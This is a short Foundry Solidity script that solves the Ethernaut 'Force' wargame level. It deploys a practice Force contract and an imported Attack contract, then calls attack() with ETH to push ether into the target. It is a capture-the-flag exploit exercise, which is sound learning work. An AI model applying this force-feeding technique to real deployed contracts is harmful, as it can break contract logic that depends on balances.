// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Force, Attack} from "../../src/Ethernaut/Force.sol";

contract ExploitScript is Script {
    function run() public payable {
        vm.startBroadcast();
        Force force = new Force();
        Attack attack = new Attack(address(force));
        address payable addr = payable(address(attack));
        (bool success,) = addr.call{value: msg.value}(abi.encodeWithSignature("attack()"));
        require(success, "fail");
        vm.stopBroadcast();
    }
}
